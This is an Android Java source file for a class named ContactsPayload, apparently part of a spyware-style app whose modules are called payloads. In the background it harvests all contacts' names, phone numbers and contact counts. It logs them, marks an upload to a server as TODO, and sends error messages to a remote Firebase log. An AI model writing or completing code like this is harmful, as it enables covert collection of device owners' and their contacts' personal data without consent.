package com.aigs.serviceone.payload;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.util.Log;

import com.aigs.serviceone.helpers.PayloadTypes;
import com.google.firebase.database.FirebaseDatabase;

import java.lang.ref.WeakReference;
import java.util.HashSet;

public class ContactsPayload extends AsyncTask<String, String, Integer> {

    WeakReference<Context> context;

    public ContactsPayload(Context context) {
        this.context = new WeakReference<>(context);
    }

    private static final String[] PROJECTION = new String[]{
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER,
            ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED,
    };


    @Override
    protected Integer doInBackground(String... strings) {
        try {

            ContentResolver cr = context.get().getContentResolver();

            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, PROJECTION, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
            if (cursor != null) {
                HashSet<String> mobileNoSet = new HashSet<>();
                try {
                    final int nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                    final int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    final int timesContactedIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED);

                    String name, number, times_called;
                    while (cursor.moveToNext()) {
                        name = cursor.getString(nameIndex);
                        number = cursor.getString(numberIndex);
                        times_called = cursor.getString(timesContactedIndex);
                        number = number.replace(" ", "");
                        if (!mobileNoSet.contains(number)) {
                            // contactList.add(new Contact(name, number));
                            //TODO UPDATE TO SERVER
                            mobileNoSet.add(number);
                            Log.d("hvy", "onCreaterrView  Phone Number: name = " + name
                                    + " No = " + number + " Contacted " + times_called + " Times");
                        }
                    }
                } finally {
                    cursor.close();
                }
            }
        } catch (Exception e) {
            Log.e("ERROR_CON : ", e.getMessage());
            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_USER_CONTACTS+"").child("CurrentLog").setValue(e.getMessage());
        }

        return null;
    }
}
